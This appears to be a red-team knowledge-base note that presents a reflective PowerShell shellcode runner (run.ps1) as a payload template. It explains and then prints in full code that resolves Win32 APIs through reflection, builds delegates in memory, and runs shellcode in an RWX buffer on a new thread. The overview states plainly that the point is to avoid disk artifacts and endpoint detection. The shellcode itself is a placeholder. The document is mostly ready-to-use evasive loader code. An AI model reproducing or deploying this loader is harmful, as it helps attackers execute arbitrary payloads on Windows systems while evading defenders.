---
aliases:
  - run.ps1
tags:
  - 💣Payload
primary categories:
  - "[[Development]]"
  - "[[Penetration Test]]"
  - "[[Red Team]]"
secondary categories:
  - "[[PowerShell]]"
  - "[[Weaponization]]"
  - "[[Payload Engineering]]"
type: Payload
---
# [[Reflective PowerShell Shellcode Runner]]

***

## Overview

This reflective PowerShell shellcode runner template provides a stealthier alternative to traditional in-memory payload delivery by avoiding the use of disk-backed artifacts. A common method of executing unmanaged code in PowerShell is through the `Add-Type` cmdlet, which compiles and stores .NET assemblies to disk — a behavior that can trigger detection from endpoint monitoring tools. In contrast, this template performs all operations entirely in memory, eliminating the reliance on `Add-Type` and minimizing forensic evidence. This payload template is largely based on [`run.ps1`](https://gist.github.com/braaaax/41789bad5d07b8ba236299047a774ffa) by [_braaaax_](https://github.com/braaaax).

The payload follows a three-step reflective injection process, all without relying on `Add-Type` or writing any assemblies to disk:

### 1. Dynamic Win32 API Resolution

Using .NET reflection, the script locates function pointers for native Win32 APIs like `VirtualAlloc`, `CreateThread`, and `WaitForSingleObject` by querying loaded modules and calling `GetProcAddress`:

```powershell
# Function to dynamically resolve the address of a Win32 API function in memory
function LookupFunc {
        Param ($moduleName, $functionName)

		# Get the 'UnsafeNativeMethods' type from the loaded System.dll assembly
        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
				    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
				    ).GetType('Microsoft.Win32.UnsafeNativeMethods')
	    
	    $tmp=@()

		# Filter out the 'GetProcAddress' method
	    $assem.GetMethods() | ForEach-Object {
		    If($_.Name -eq "GetProcAddress") {$tmp+=$_}
		}

		# Invoke GetProcAddress(GetModuleHandle($moduleName), $functionName)
        return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}
```

### 2. Delegate Construction for API Invocation

Since .NET requires strong typing for API calls, the script uses `System.Reflection.Emit` to define method signatures at runtime. This allows for calling unmanaged APIs using the correct parameter and return types:

```powershell
# Function to dynamically generate a delegate type for a given API function signature
function getDelegateType {
        Param (
            [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
            [Parameter(Position = 1)] [Type] $delType = [Void]
        )

		# Define a dynamic in-memory assembly to hold the delegate type
        $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
			        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
			        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
			        ).DefineDynamicModule('InMemoryModule', $false).DefineType(
				        'MyDelegateType', 
				        'Class, Public, Sealed, AnsiClass, AutoClass',
				        [System.MulticastDelegate]
				    )

		# Define the constructor required for a delegate type
		$type.DefineConstructor('RTSpecialName, HideBySig, Public',
								[System.Reflection.CallingConventions]::Standard,
								$func).SetImplementationFlags('Runtime, Managed')

		# Define the 'Invoke' method for the delegate (used to call the function)
		$type.DefineMethod('Invoke',
							'Public, HideBySig, NewSlot, Virtual',
							$delType,
							$func).SetImplementationFlags('Runtime, Managed')

		# Create and return the delegate type
        return $type.CreateType()
}
```

### 3. Allocate Memory, Inject Shellcode, and Invoke Execution

With the shellcode hard coded in a byte array, the script allocates *RWX* memory, copies the payload into it, and creates a new thread to execute it. The entire process is conducted using delegates and Win32 APIs resolved in-memory:

```powershell
# Replace this with actual shellcode bytes
[Byte[]] $buf = <shellcode-buffer-byte-array>

# Allocate memory
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
	(LookupFunc kernel32.dll VirtualAlloc),
	(getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32]) ([IntPtr]))
	).Invoke([IntPtr]::Zero, $buf.length, 0x3000, 0x40)

# Copy shellcode into allocated memory
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

# Execute shellcode in new thread
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
	(LookupFunc kernel32.dll CreateThread), 
	(getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
	).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

# Wait for thread to complete
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

## File Contents

### `run.ps1`

```powershell
function LookupFunc {
        Param ($moduleName, $functionName)

        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
				    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
				    ).GetType('Microsoft.Win32.UnsafeNativeMethods')
	    
	    $tmp=@()

	    $assem.GetMethods() | ForEach-Object {
		    If($_.Name -eq "GetProcAddress") {$tmp+=$_}
		}

        return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
        Param (
            [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
            [Parameter(Position = 1)] [Type] $delType = [Void]
        )

        $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
			        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
			        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
			        ).DefineDynamicModule('InMemoryModule', $false).DefineType(
				        'MyDelegateType', 
				        'Class, Public, Sealed, AnsiClass, AutoClass',
				        [System.MulticastDelegate]
				    )

		$type.DefineConstructor('RTSpecialName, HideBySig, Public',
								[System.Reflection.CallingConventions]::Standard,
								$func).SetImplementationFlags('Runtime, Managed')

		$type.DefineMethod('Invoke',
							'Public, HideBySig, NewSlot, Virtual',
							$delType,
							$func).SetImplementationFlags('Runtime, Managed')

        return $type.CreateType()
}

[Byte[]] $buf = <shellcode-buffer-byte-array>

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
	(LookupFunc kernel32.dll VirtualAlloc),
	(getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32]) ([IntPtr]))
	).Invoke([IntPtr]::Zero, $buf.length, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
	(LookupFunc kernel32.dll CreateThread), 
	(getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
	).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

***

## Resources

| Hyperlink                                                                            | Info                                               |
| ------------------------------------------------------------------------------------ | -------------------------------------------------- |
| [run.ps1, braaaax](https://gist.github.com/braaaax/41789bad5d07b8ba236299047a774ffa) | GitHub Gist page for reflective PowerShell payload |

***

*Created Date*: <%+tp.file.creation_date("MMMM Do YYYY (HH:mm a)")%>  
*Last Modified Date*: <%+tp.file.last_modified_date("MMMM Do YYYY (HH:mm a)")%>
